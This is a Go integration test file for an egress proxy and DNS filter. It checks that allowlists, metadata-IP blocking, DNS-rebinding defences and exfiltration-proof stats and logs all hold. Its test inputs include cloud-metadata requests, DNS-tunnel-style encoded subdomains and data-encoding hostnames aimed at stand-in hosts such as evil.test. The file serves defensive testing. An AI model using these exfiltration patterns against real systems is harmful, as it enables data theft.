package egress_test

// Integration tests: the full service (proxy, DNS, stats) on 127.0.0.1
// random ports, with local HTTP and HTTPS upstreams, a fake upstream DNS
// server, and test hooks that (a) map client source ports to caller IPs and
// (b) route dials for fake public IPs to the local upstreams. Every policy
// check runs unchanged. These mirror acceptance test A8.

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"log/slog"
	"net"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/miekg/dns"

	"github.com/sealed-dev/sealed/runtime/egress"
	"github.com/sealed-dev/sealed/runtime/egress/auth"
	"github.com/sealed-dev/sealed/runtime/egress/internal/dnstest"
	"github.com/sealed-dev/sealed/runtime/egress/limits"
	"github.com/sealed-dev/sealed/runtime/egress/policy"
	"github.com/sealed-dev/sealed/runtime/egress/stats"
)

var (
	alphaIP   = netip.MustParseAddr("172.30.0.16")
	betaIP    = netip.MustParseAddr("172.30.0.17")
	agentIP   = netip.MustParseAddr("172.30.0.3")
	unknownIP = netip.MustParseAddr("172.30.0.99")
)

// identities maps client source ports to the caller IP they stand for.
type identities struct {
	mu     sync.Mutex
	byPort map[uint16]netip.Addr
}

func (id *identities) sourceIP(ap netip.AddrPort) netip.Addr {
	id.mu.Lock()
	defer id.mu.Unlock()
	if a, ok := id.byPort[ap.Port()]; ok {
		return a
	}
	return ap.Addr()
}

// dialer connects as caller as. The socket is bound and its port
// registered before connect, because egress looks the caller up as soon as
// it accepts the connection (per-caller connection limits).
func (id *identities) dialer(as netip.Addr) func(ctx context.Context, network, addr string) (net.Conn, error) {
	return func(ctx context.Context, network, addr string) (net.Conn, error) {
		d := &net.Dialer{Control: func(_, _ string, rc syscall.RawConn) error {
			var bindErr error
			err := rc.Control(func(fd uintptr) {
				if bindErr = syscall.Bind(int(fd), &syscall.SockaddrInet4{Addr: [4]byte{127, 0, 0, 1}}); bindErr != nil {
					return
				}
				sa, err := syscall.Getsockname(int(fd))
				if err != nil {
					bindErr = err
					return
				}
				in4, ok := sa.(*syscall.SockaddrInet4)
				if !ok {
					bindErr = fmt.Errorf("unexpected local address %T", sa)
					return
				}
				id.mu.Lock()
				id.byPort[uint16(in4.Port)] = as
				id.mu.Unlock()
			})
			if err != nil {
				return err
			}
			return bindErr
		}}
		return d.DialContext(ctx, network, addr)
	}
}

// routes sends outbound dials for fake public addresses to local servers,
// and records every address the proxy dialed.
type routes struct {
	mu     sync.Mutex
	table  map[string]string
	dialed []string
}

func (r *routes) dial(ctx context.Context, network, addr string) (net.Conn, error) {
	r.mu.Lock()
	r.dialed = append(r.dialed, addr)
	target, ok := r.table[addr]
	r.mu.Unlock()
	if !ok {
		return nil, fmt.Errorf("test: no route for %s", addr)
	}
	return (&net.Dialer{}).DialContext(ctx, network, target)
}

func (r *routes) wasDialed(prefix string) bool {
	r.mu.Lock()
	defer r.mu.Unlock()
	for _, d := range r.dialed {
		if strings.HasPrefix(d, prefix) {
			return true
		}
	}
	return false
}

type syncBuffer struct {
	mu  sync.Mutex
	buf bytes.Buffer
}

func (b *syncBuffer) Write(p []byte) (int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.Write(p)
}

func (b *syncBuffer) String() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.buf.String()
}

type env struct {
	t       *testing.T
	svc     *egress.Service
	id      *identities
	routes  *routes
	dns     *dnstest.Server
	logs    *syncBuffer
	roots   *x509.CertPool
	authDir string
}

func clearProxyEnv(t *testing.T) {
	for _, v := range []string{"HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy", "ALL_PROXY", "all_proxy"} {
		t.Setenv(v, "")
	}
}

func startEnv(t *testing.T) *env { return startEnvWith(t, nil) }

// startEnvWith lets a test adjust the config and options before Start.
func startEnvWith(t *testing.T, mutate func(cfg *policy.Config, opts *egress.Options)) *env {
	t.Helper()
	clearProxyEnv(t)

	tlsUp := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "tls %s %s", r.Host, r.URL.Path)
	}))
	tlsUp.Config.ErrorLog = log.New(io.Discard, "", 0) // tunnels closed mid-handshake are expected
	tlsUp.StartTLS()
	t.Cleanup(tlsUp.Close)
	httpUp := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Proxy-Authorization") != "" {
			fmt.Fprint(w, "LEAKED-PROXY-CREDENTIAL ")
		}
		fmt.Fprintf(w, "http %s %s", r.Host, r.URL.Path)
	}))
	t.Cleanup(httpUp.Close)
	roots := x509.NewCertPool()
	roots.AddCert(tlsUp.Certificate())
	tlsAddr := strings.TrimPrefix(tlsUp.URL, "https://")
	httpAddr := strings.TrimPrefix(httpUp.URL, "http://")

	up := dnstest.Start(t)
	up.AddA("api.alpha.test", "203.0.113.10")
	up.AddA("api.agent.test", "203.0.113.30")
	up.AddWildcardA("wild.alpha.test", "203.0.113.11")
	up.AddA("beta.test", "203.0.113.20")
	up.AddA("rebind.alpha.test", "169.254.169.254")
	up.AddAAAA("rebind6.alpha.test", "::ffff:169.254.169.254", "fd20:ce::254")
	up.AddA("loop.alpha.test", "127.0.0.1")
	up.AddA("private.alpha.test", "10.0.0.5")
	up.AddA("vpc.alpha.test", "10.20.0.5")
	up.AddWildcardA("evil.test", "203.0.113.66")
	up.AddA("evil.test", "203.0.113.66")
	var many []string
	for i := 1; i <= 120; i++ {
		many = append(many, fmt.Sprintf("203.0.113.%d", i))
	}
	up.AddA("big.alpha.test", many...)

	rt := &routes{table: map[string]string{
		"203.0.113.10:443": tlsAddr,
		"203.0.113.10:80":  httpAddr,
		"203.0.113.11:443": tlsAddr,
		"203.0.113.20:443": tlsAddr,
		"203.0.113.30:443": tlsAddr,
		"203.0.113.30:80":  httpAddr,
		"198.51.100.7:443": tlsAddr,
		"10.20.0.5:443":    tlsAddr,
		"203.0.113.66:443": tlsAddr, // must never be used
		"203.0.113.66:80":  httpAddr,
	}}

	cfg := &policy.Config{
		Listen:      &policy.Listen{Proxy: "127.0.0.1:0", DNS: "127.0.0.1:0", Stats: "127.0.0.1:0"},
		UpstreamDNS: []string{up.Addr},
		Callers: []policy.Caller{
			{Name: "sealed-agent", IP: agentIP.String(), Allow: []string{"api.agent.test:443", "api.agent.test:80"}},
			{Name: "alpha", IP: alphaIP.String(), Allow: []string{
				"api.alpha.test:443",
				"api.alpha.test:80",
				"*.wild.alpha.test:443",
				"rebind.alpha.test:443",
				"rebind.alpha.test:80",
				"rebind6.alpha.test:443",
				"loop.alpha.test:443",
				"private.alpha.test:443",
				"vpc.alpha.test:443",
				"big.alpha.test:443",
				"198.51.100.7:443",
			}},
			{Name: "beta", IP: betaIP.String(), Allow: []string{"beta.test:443"}},
		},
		AllowedPrivateCIDRs: []string{"10.20.0.0/16"},
		StatsReaders:        []string{agentIP.String()},
	}
	id := &identities{byPort: map[uint16]netip.Addr{}}
	logs := &syncBuffer{}
	opts := egress.Options{
		Logger:           slog.New(slog.NewJSONHandler(logs, nil)),
		StatsLogInterval: 50 * time.Millisecond,
		AuthDir:          t.TempDir(),
		// The test host's own interfaces must not decide results.
		LocalSubnets: func() ([]netip.Prefix, error) { return nil, nil },
		SourceIP:     id.sourceIP,
		Dial:         rt.dial,
	}
	if mutate != nil {
		mutate(cfg, &opts)
	}
	data, err := policy.EncodeCanonical(cfg)
	if err != nil {
		t.Fatal(err)
	}
	parsed, err := policy.Parse(data)
	if err != nil {
		t.Fatal(err)
	}
	svc, err := egress.Start(parsed, opts)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = svc.Shutdown(ctx)
	})
	return &env{t: t, svc: svc, id: id, routes: rt, dns: up, logs: logs, roots: roots, authDir: opts.AuthDir}
}

// client is an HTTP client for caller as, using the egress as its proxy.
func (e *env) client(as netip.Addr) *http.Client {
	proxyURL, _ := url.Parse("http://" + e.svc.ProxyAddr.String())
	return &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			Proxy:             http.ProxyURL(proxyURL),
			DialContext:       e.id.dialer(as),
			TLSClientConfig:   &tls.Config{RootCAs: e.roots, ServerName: "example.com"},
			DisableKeepAlives: true,
		},
	}
}

func (e *env) get(as netip.Addr, rawURL string) (int, string) {
	e.t.Helper()
	resp, err := e.client(as).Get(rawURL)
	if err != nil {
		return 0, err.Error()
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body)
}

// raw sends one request with the given request line and headers straight
// to the proxy and returns the status code.
func (e *env) raw(as netip.Addr, method, target string, headers ...string) int {
	e.t.Helper()
	conn, err := e.id.dialer(as)(context.Background(), "tcp", e.svc.ProxyAddr.String())
	if err != nil {
		e.t.Fatal(err)
	}
	defer conn.Close()
	host := target
	if u, err := url.Parse(target); err == nil && u.Host != "" {
		host = u.Host
	}
	var b strings.Builder
	fmt.Fprintf(&b, "%s %s HTTP/1.1\r\nHost: %s\r\n", method, target, host)
	for _, h := range headers {
		b.WriteString(h + "\r\n")
	}
	b.WriteString("\r\n")
	if _, err := io.WriteString(conn, b.String()); err != nil {
		e.t.Fatal(err)
	}
	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	resp, err := http.ReadResponse(bufio.NewReader(conn), &http.Request{Method: method})
	if err != nil {
		e.t.Fatalf("%s %s: %v", method, target, err)
	}
	resp.Body.Close()
	return resp.StatusCode
}

func (e *env) connect(as netip.Addr, target string, headers ...string) int {
	return e.raw(as, http.MethodConnect, target, headers...)
}

// lookup sends one DNS query to the egress as caller as.
func (e *env) lookup(as netip.Addr, network, name string, qtype uint16) *dns.Msg {
	e.t.Helper()
	addr := e.svc.DNSUDPAddr.String()
	if network == "tcp" {
		addr = e.svc.DNSTCPAddr.String()
	}
	conn, err := e.id.dialer(as)(context.Background(), network, addr)
	if err != nil {
		e.t.Fatal(err)
	}
	defer conn.Close()
	q := new(dns.Msg)
	q.SetQuestion(dns.Fqdn(name), qtype)
	c := &dns.Client{Net: network, Timeout: 3 * time.Second}
	r, _, err := c.ExchangeWithConn(q, &dns.Conn{Conn: conn})
	if err != nil {
		e.t.Fatalf("lookup %s: %v", name, err)
	}
	return r
}

func (e *env) stats(as netip.Addr) (int, stats.Snapshot) {
	e.t.Helper()
	tr := &http.Transport{DialContext: e.id.dialer(as), DisableKeepAlives: true}
	c := &http.Client{Transport: tr, Timeout: 5 * time.Second}
	resp, err := c.Get("http://" + e.svc.StatsAddr.String() + "/v1/stats")
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	var s stats.Snapshot
	if resp.StatusCode == http.StatusOK {
		if err := json.NewDecoder(resp.Body).Decode(&s); err != nil {
			e.t.Fatal(err)
		}
	}
	return resp.StatusCode, s
}

func TestAllowedHostWorksOverConnectAndHTTP(t *testing.T) {
	e := startEnv(t)
	code, body := e.get(alphaIP, "https://api.alpha.test/hello")
	if code != http.StatusOK || body != "tls api.alpha.test /hello" {
		t.Fatalf("CONNECT: %d %q", code, body)
	}
	code, body = e.get(alphaIP, "http://api.alpha.test/plain")
	if code != http.StatusOK || body != "http api.alpha.test /plain" {
		t.Fatalf("absolute-URI HTTP: %d %q", code, body)
	}
	if code, body := e.get(alphaIP, "https://x1.wild.alpha.test/w"); code != http.StatusOK {
		t.Fatalf("wildcard: %d %q", code, body)
	}
	if code, body := e.get(alphaIP, "https://198.51.100.7/ip"); code != http.StatusOK {
		t.Fatalf("allowlisted raw IP: %d %q", code, body)
	}
	if code, body := e.get(alphaIP, "https://vpc.alpha.test/vpc"); code != http.StatusOK {
		t.Fatalf("private address inside allowedPrivateCidrs: %d %q", code, body)
	}
	_, s := e.stats(agentIP)
	a := s.Callers["alpha"].Allowed
	for _, key := range []string{"api.alpha.test:443", "api.alpha.test:80", "*.wild.alpha.test:443", "198.51.100.7:443", "vpc.alpha.test:443"} {
		if a[key] != 1 {
			t.Errorf("allowed[%s] = %d, want 1 (all: %v)", key, a[key], a)
		}
	}
}

func TestNonAllowlistedHostIsBlockedAndCounted(t *testing.T) {
	e := startEnv(t)
	if code := e.connect(alphaIP, "evil.test:443"); code != http.StatusForbidden {
		t.Errorf("CONNECT evil.test:443 = %d, want 403", code)
	}
	if code := e.raw(alphaIP, http.MethodGet, "http://evil.test/x"); code != http.StatusForbidden {
		t.Errorf("GET http://evil.test = %d, want 403", code)
	}
	if code := e.connect(alphaIP, "x9k2.evil.test:443"); code != http.StatusForbidden {
		t.Errorf("CONNECT x9k2.evil.test:443 = %d, want 403", code)
	}
	if code := e.connect(alphaIP, "api.alpha.test:22"); code != http.StatusForbidden {
		t.Errorf("unlisted port = %d, want 403", code)
	}
	if code := e.connect(alphaIP, "a.b.wild.alpha.test:443"); code != http.StatusForbidden {
		t.Errorf("two-label wildcard = %d, want 403", code)
	}
	if code := e.connect(alphaIP, "wild.alpha.test:443"); code != http.StatusForbidden {
		t.Errorf("wildcard apex = %d, want 403", code)
	}
	if e.routes.wasDialed("203.0.113.66") {
		t.Error("proxy dialed a blocked destination")
	}
	if e.dns.QueriedName("evil.test") {
		t.Error("blocked name was resolved upstream")
	}
	_, s := e.stats(agentIP)
	b := s.Callers["alpha"].Blocked
	// Names off the allowlist collapse to unlisted:<port>; a name on it with
	// an unlisted port keeps its entry pattern with a port token.
	if b["unlisted:443"] != 4 || b["unlisted:80"] != 1 || b["api.alpha.test:other"] != 1 || len(b) != 3 {
		t.Errorf("blocked = %v", b)
	}
	if s.Blocked["unlisted:443"] != 4 {
		t.Errorf("aggregate blocked = %v", s.Blocked)
	}
}

func TestRawIPAndMetadataAreBlocked(t *testing.T) {
	e := startEnv(t)
	for _, target := range []string{"203.0.113.66:443", "169.254.169.254:80", "169.254.169.254:443", "127.0.0.1:443", "10.0.0.5:443", "[::1]:443", "[fd20:ce::254]:80"} {
		if code := e.connect(alphaIP, target); code != http.StatusForbidden {
			t.Errorf("CONNECT %s = %d, want 403", target, code)
		}
	}
	if code := e.raw(alphaIP, http.MethodGet, "http://169.254.169.254/computeMetadata/v1/", "Metadata-Flavor: Google"); code != http.StatusForbidden {
		t.Errorf("GET metadata = %d, want 403", code)
	}
	if e.routes.wasDialed("169.254.") || e.routes.wasDialed("127.") || e.routes.wasDialed("203.0.113.66") {
		t.Errorf("proxy dialed a denied address: %v", e.routes.dialed)
	}
	_, s := e.stats(agentIP)
	b := s.Callers["alpha"].Blocked
	want := stats.Counts{"ip-public:443": 1, "ip-metadata:80": 3, "ip-metadata:443": 1, "ip-loopback:443": 2, "ip-private:443": 1}
	if fmt.Sprint(b) != fmt.Sprint(want) {
		t.Errorf("blocked = %v, want %v", b, want)
	}
}

func TestMetadataBlockedEvenWhenAllowedNameResolvesToIt(t *testing.T) {
	e := startEnv(t)
	for _, target := range []string{"rebind.alpha.test:443", "rebind6.alpha.test:443", "loop.alpha.test:443", "private.alpha.test:443"} {
		if code := e.connect(alphaIP, target); code != http.StatusForbidden {
			t.Errorf("CONNECT %s = %d, want 403", target, code)
		}
	}
	if !e.dns.QueriedName("rebind.alpha.test") {
		t.Error("allowed name was not resolved, so the IP check never ran")
	}
	if e.routes.wasDialed("169.254.") || e.routes.wasDialed("127.") || e.routes.wasDialed("10.0.0.5") || e.routes.wasDialed("[") {
		t.Errorf("proxy dialed a denied address: %v", e.routes.dialed)
	}
	_, s := e.stats(agentIP)
	b := s.Callers["alpha"].Blocked
	for _, key := range []string{"rebind.alpha.test:443", "rebind6.alpha.test:443", "loop.alpha.test:443", "private.alpha.test:443"} {
		if b[key] != 1 {
			t.Errorf("blocked[%s] = %d (all: %v)", key, b[key], b)
		}
	}
	// The DNS server strips the same answers.
	r := e.lookup(alphaIP, "udp", "rebind.alpha.test", dns.TypeA)
	if r.Rcode != dns.RcodeSuccess || len(r.Answer) != 0 {
		t.Errorf("DNS returned the metadata address: %v", r.Answer)
	}
	r = e.lookup(alphaIP, "udp", "rebind6.alpha.test", dns.TypeAAAA)
	if r.Rcode != dns.RcodeSuccess || len(r.Answer) != 0 {
		t.Errorf("DNS returned an IPv6 metadata address: %v", r.Answer)
	}
}

func TestRandomSubdomainLookupIsNXDOMAINAndCounted(t *testing.T) {
	e := startEnv(t)
	for _, name := range []string{"7f3a9c1e5b.evil.test", "aGVsbG8gd29ybGQ.evil.test"} {
		r := e.lookup(alphaIP, "udp", name, dns.TypeA)
		if r.Rcode != dns.RcodeNameError || len(r.Answer) != 0 {
			t.Errorf("%s: rcode %s, want NXDOMAIN", name, dns.RcodeToString[r.Rcode])
		}
	}
	if r := e.lookup(alphaIP, "tcp", "q1.evil.test", dns.TypeTXT); r.Rcode != dns.RcodeNameError {
		t.Errorf("TXT over TCP: %s", dns.RcodeToString[r.Rcode])
	}
	if r := e.lookup(alphaIP, "udp", "api.alpha.test", dns.TypeANY); r.Rcode != dns.RcodeRefused {
		t.Errorf("ANY: %s", dns.RcodeToString[r.Rcode])
	}
	r := e.lookup(alphaIP, "udp", "api.alpha.test", dns.TypeA)
	if r.Rcode != dns.RcodeSuccess || len(r.Answer) != 1 || r.Answer[0].(*dns.A).A.String() != "203.0.113.10" {
		t.Errorf("allowed lookup: %v", r)
	}
	if e.dns.QueriedName("7f3a9c1e5b.evil.test") {
		t.Error("random subdomain reached the upstream resolver")
	}
	_, s := e.stats(agentIP)
	if got := s.Callers["alpha"].Blocked["unlisted:53"]; got != 3 {
		t.Errorf("blocked[unlisted:53] = %d (all: %v)", got, s.Callers["alpha"].Blocked)
	}
	for k := range s.Blocked {
		if strings.Contains(k, "7f3a9c1e5b") || strings.Contains(k, "aGVsbG8") || strings.Contains(k, "evil") {
			t.Errorf("stats key %q carries part of the queried name", k)
		}
	}
}

func TestDNSTruncationRetryOverTCP(t *testing.T) {
	e := startEnv(t)
	r := e.lookup(alphaIP, "udp", "big.alpha.test", dns.TypeA)
	if !r.Truncated || len(r.Answer) == 120 {
		t.Fatalf("UDP: truncated=%v answers=%d", r.Truncated, len(r.Answer))
	}
	r = e.lookup(alphaIP, "tcp", "big.alpha.test", dns.TypeA)
	if r.Truncated || len(r.Answer) != 120 {
		t.Fatalf("TCP: truncated=%v answers=%d", r.Truncated, len(r.Answer))
	}
	sawTCP := false
	for _, q := range e.dns.Queries() {
		sawTCP = sawTCP || (q.Name == "big.alpha.test." && q.Net == "tcp")
	}
	if !sawTCP {
		t.Error("egress did not retry the truncated upstream answer over TCP")
	}
}

func TestPerCallerIsolation(t *testing.T) {
	e := startEnv(t)
	if code := e.connect(betaIP, "api.alpha.test:443"); code != http.StatusForbidden {
		t.Errorf("beta -> alpha's host = %d, want 403", code)
	}
	if code := e.connect(alphaIP, "beta.test:443"); code != http.StatusForbidden {
		t.Errorf("alpha -> beta's host = %d, want 403", code)
	}
	if code, body := e.get(betaIP, "https://beta.test/b"); code != http.StatusOK {
		t.Errorf("beta -> beta.test = %d %q", code, body)
	}
	if code := e.connect(unknownIP, "api.alpha.test:443"); code != http.StatusForbidden {
		t.Errorf("unknown source = %d, want 403", code)
	}
	if r := e.lookup(betaIP, "udp", "api.alpha.test", dns.TypeA); r.Rcode != dns.RcodeNameError {
		t.Errorf("beta resolved alpha's name: %s", dns.RcodeToString[r.Rcode])
	}
	if r := e.lookup(unknownIP, "udp", "api.alpha.test", dns.TypeA); r.Rcode != dns.RcodeRefused {
		t.Errorf("unknown source DNS: %s", dns.RcodeToString[r.Rcode])
	}
	_, s := e.stats(agentIP)
	if s.Callers["beta"].Blocked["unlisted:443"] != 1 || s.Callers["alpha"].Blocked["unlisted:443"] != 1 {
		t.Errorf("isolation blocks: %v", s.Callers)
	}
	if s.Callers["beta"].Allowed["beta.test:443"] != 1 {
		t.Errorf("beta allowed: %v", s.Callers["beta"])
	}
	if s.Callers[policy.UnknownCaller].Blocked["unlisted:443"] != 1 || s.Callers[policy.UnknownCaller].Blocked["unlisted:53"] != 1 {
		t.Errorf("unknown source: %v", s.Callers[policy.UnknownCaller])
	}
}

func TestProxyRefusesTLSShortcutsAndChaining(t *testing.T) {
	e := startEnv(t)
	// Absolute https:// URLs would make the proxy speak TLS for the client.
	if code := e.raw(alphaIP, http.MethodGet, "https://api.alpha.test/"); code != http.StatusForbidden {
		t.Errorf("absolute https URL = %d, want 403", code)
	}
	// Client-chosen upstream proxy (smokescreen feature) is never allowed.
	if code := e.connect(alphaIP, "api.alpha.test:443", "X-Upstream-Https-Proxy: https://203.0.113.66:3128"); code != http.StatusForbidden {
		t.Errorf("X-Upstream-Https-Proxy = %d, want 403", code)
	}
	// A second, conflicting Host header is rejected outright, so the request
	// can never be routed by one host and checked against another.
	if code := e.raw(alphaIP, http.MethodGet, "http://api.alpha.test/", "Host: evil.test"); code != http.StatusBadRequest {
		t.Errorf("conflicting Host headers = %d, want 400", code)
	}
	if e.routes.wasDialed("203.0.113.66") {
		t.Error("proxy dialed the client-chosen proxy")
	}
	// Non-proxy requests are rejected without counting.
	if code := e.raw(alphaIP, http.MethodGet, "/v1/stats"); code != http.StatusBadRequest {
		t.Errorf("origin-form request = %d, want 400", code)
	}
}

func TestStatsEndpointRefusesNonReaders(t *testing.T) {
	e := startEnv(t)
	for _, who := range []netip.Addr{alphaIP, betaIP, unknownIP} {
		if code, _ := e.stats(who); code != http.StatusForbidden {
			t.Errorf("stats from %s = %d, want 403", who, code)
		}
	}
	code, s := e.stats(agentIP)
	if code != http.StatusOK || s.Since == 0 || s.Allowed == nil || s.Blocked == nil {
		t.Errorf("stats from agent = %d %+v", code, s)
	}
	resp, err := (&http.Client{Timeout: 2 * time.Second}).Get("http://" + e.svc.StatsAddr.String() + "/healthz")
	if err != nil || resp.StatusCode != http.StatusOK {
		t.Errorf("healthz: %v %v", resp, err)
	}
	if resp != nil {
		resp.Body.Close()
	}
}

func TestLogsCarryCountsOnly(t *testing.T) {
	e := startEnv(t)
	e.get(alphaIP, "http://api.alpha.test/secret-path?token=hunter2")
	e.raw(alphaIP, http.MethodGet, "http://evil.test/other-secret?q=payload")
	e.lookup(alphaIP, "udp", "exfil-c2VjcmV0.evil.test", dns.TypeA)

	deadline := time.Now().Add(3 * time.Second)
	for !strings.Contains(e.logs.String(), `"blocked":2`) && time.Now().Before(deadline) {
		time.Sleep(20 * time.Millisecond)
	}
	logs := e.logs.String()
	if !strings.Contains(logs, `"msg":"egress counts"`) || !strings.Contains(logs, `"api.alpha.test:80":1`) {
		t.Fatalf("no counts line with destinations: %s", logs)
	}
	for _, leak := range []string{"secret-path", "hunter2", "token", "other-secret", "payload", "c2VjcmV0", "203.0.113", "127.0.0.1", "evil"} {
		if strings.Contains(logs, leak) {
			t.Errorf("logs contain %q: %s", leak, logs)
		}
	}
}

func TestShutdownClosesTunnels(t *testing.T) {
	clearProxyEnv(t)
	e := startEnv(t)
	conn, err := e.id.dialer(alphaIP)(context.Background(), "tcp", e.svc.ProxyAddr.String())
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	fmt.Fprintf(conn, "CONNECT api.alpha.test:443 HTTP/1.1\r\nHost: api.alpha.test:443\r\n\r\n")
	br := bufio.NewReader(conn)
	resp, err := http.ReadResponse(br, &http.Request{Method: http.MethodConnect})
	if err != nil || resp.StatusCode != http.StatusOK {
		t.Fatalf("CONNECT: %v %v", resp, err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
	defer cancel()
	start := time.Now()
	if err := e.svc.Shutdown(ctx); err != nil {
		t.Fatalf("Shutdown: %v", err)
	}
	if time.Since(start) > 3*time.Second {
		t.Error("Shutdown did not respect its deadline")
	}
	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	if _, err := br.ReadByte(); err == nil {
		t.Error("tunnel still open after shutdown")
	}
	if _, err := net.DialTimeout("tcp", e.svc.ProxyAddr.String(), time.Second); err == nil {
		t.Error("proxy still accepting after shutdown")
	}
}

func TestStartRejectsProxyEnvironment(t *testing.T) {
	clearProxyEnv(t)
	t.Setenv("HTTPS_PROXY", "http://203.0.113.66:3128")
	cfg := &policy.Config{
		Listen:              &policy.Listen{Proxy: "127.0.0.1:0", DNS: "127.0.0.1:0", Stats: "127.0.0.1:0"},
		UpstreamDNS:         []string{"127.0.0.1:53"},
		Callers:             []policy.Caller{},
		AllowedPrivateCIDRs: []string{},
		StatsReaders:        []string{},
	}
	if _, err := egress.Start(cfg, egress.Options{}); err == nil || !strings.Contains(err.Error(), "HTTPS_PROXY") {
		t.Fatalf("Start = %v, want HTTPS_PROXY error", err)
	}
}

// statsBody returns the raw GET /v1/stats body as the agent sees it.
func (e *env) statsBody(as netip.Addr, headers ...string) (int, string) {
	e.t.Helper()
	req, err := http.NewRequest(http.MethodGet, "http://"+e.svc.StatsAddr.String()+"/v1/stats", nil)
	if err != nil {
		e.t.Fatal(err)
	}
	for i := 0; i+1 < len(headers); i += 2 {
		req.Header.Set(headers[i], headers[i+1])
	}
	c := &http.Client{Transport: &http.Transport{DialContext: e.id.dialer(as), DisableKeepAlives: true}, Timeout: 5 * time.Second}
	resp, err := c.Do(req)
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body)
}

// TestChosenNamesAndIPsNeverReachStats is the P5 regression test: a
// container that picks destination names, labels, IPs or ports to encode
// data must not get any of them into /v1/stats, which leaves the VM.
func TestChosenNamesAndIPsNeverReachStats(t *testing.T) {
	e := startEnv(t)
	for _, target := range []string{
		"thisisexfiltrateddata0123456789abcdef.github.io:443",
		"secretpayload42.com:443",
		"x.secretpayload43.a.run.app:443",
		"203.0.113.77:443",
		"203.0.113.78:31337",
		"api.alpha.test:31338",
		"q.wild.alpha.test:31339",
	} {
		if code := e.connect(alphaIP, target); code != http.StatusForbidden {
			t.Errorf("CONNECT %s = %d, want 403", target, code)
		}
	}
	if code := e.raw(alphaIP, http.MethodGet, "http://exfil-6162636465.example.org:8081/"); code != http.StatusForbidden {
		t.Errorf("plain HTTP = %d", code)
	}
	for _, name := range []string{"dGhpcyBpcyBzZWNyZXQ.com", "secretpayload44.com", "chunk-7a7a7a.github.io"} {
		if r := e.lookup(alphaIP, "udp", name, dns.TypeA); r.Rcode != dns.RcodeNameError {
			t.Errorf("lookup %s: %s", name, dns.RcodeToString[r.Rcode])
		}
	}
	code, body := e.statsBody(agentIP)
	if code != http.StatusOK {
		t.Fatalf("stats = %d", code)
	}
	for _, chosen := range []string{"exfiltrated", "secretpayload", "github", "run.app", "203.0.113.7", "31337", "31338", "31339", "6162636465", "example.org", "8081", "dGhpcyBp", "7a7a7a", ".com"} {
		if strings.Contains(body, chosen) {
			t.Errorf("stats body carries chosen data %q: %s", chosen, body)
		}
	}
	var s stats.Snapshot
	if err := json.Unmarshal([]byte(body), &s); err != nil {
		t.Fatal(err)
	}
	want := stats.Counts{
		"unlisted:443":            3,
		"unlisted:other":          1,
		"ip-public:443":           1,
		"ip-public:other":         1,
		"api.alpha.test:other":    1,
		"*.wild.alpha.test:other": 1,
		"unlisted:53":             3,
	}
	if fmt.Sprint(s.Callers["alpha"].Blocked) != fmt.Sprint(want) {
		t.Errorf("blocked = %v, want %v", s.Callers["alpha"].Blocked, want)
	}
	// The local log line uses the same keys.
	deadline := time.Now().Add(3 * time.Second)
	for !strings.Contains(e.logs.String(), `"unlisted:53"`) && time.Now().Before(deadline) {
		time.Sleep(20 * time.Millisecond)
	}
	for _, chosen := range []string{"exfiltrated", "secretpayload", "github", "31337"} {
		if strings.Contains(e.logs.String(), chosen) {
			t.Errorf("logs carry chosen data %q", chosen)
		}
	}
}

// tunnel opens a CONNECT tunnel as caller as and returns the connection
// (open) and the status the proxy answered.
func (e *env) tunnel(as netip.Addr, target string, headers ...string) (net.Conn, int) {
	e.t.Helper()
	conn, err := e.id.dialer(as)(context.Background(), "tcp", e.svc.ProxyAddr.String())
	if err != nil {
		e.t.Fatal(err)
	}
	e.t.Cleanup(func() { conn.Close() })
	var b strings.Builder
	fmt.Fprintf(&b, "CONNECT %s HTTP/1.1\r\nHost: %s\r\n", target, target)
	for _, h := range headers {
		b.WriteString(h + "\r\n")
	}
	b.WriteString("\r\n")
	if _, err := io.WriteString(conn, b.String()); err != nil {
		e.t.Fatal(err)
	}
	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	resp, err := http.ReadResponse(bufio.NewReader(conn), &http.Request{Method: http.MethodConnect})
	if err != nil {
		e.t.Fatalf("CONNECT %s: %v", target, err)
	}
	_ = conn.SetReadDeadline(time.Time{})
	return conn, resp.StatusCode
}

func TestOneCallerCannotStarveTheAgent(t *testing.T) {
	e := startEnvWith(t, func(_ *policy.Config, opts *egress.Options) {
		opts.Limits = limits.Config{ConnsReserved: 2, ConnsPerCaller: 3, ConnsShared: 2}
	})
	// alpha holds its reserved slots plus one shared, then hits its cap.
	var alphaConns []net.Conn
	for i := 0; i < 3; i++ {
		c, code := e.tunnel(alphaIP, "api.alpha.test:443")
		if code != http.StatusOK {
			t.Fatalf("alpha tunnel %d = %d", i, code)
		}
		alphaConns = append(alphaConns, c)
	}
	if _, code := e.tunnel(alphaIP, "api.alpha.test:443"); code != http.StatusTooManyRequests {
		t.Fatalf("alpha over its cap = %d, want 429", code)
	}
	// beta takes the last shared slot.
	for i := 0; i < 3; i++ {
		if _, code := e.tunnel(betaIP, "beta.test:443"); code != http.StatusOK {
			t.Fatalf("beta tunnel %d = %d", i, code)
		}
	}
	// The shared pool is empty, but sealed-agent still gets its reserved
	// share, over CONNECT and plain HTTP alike.
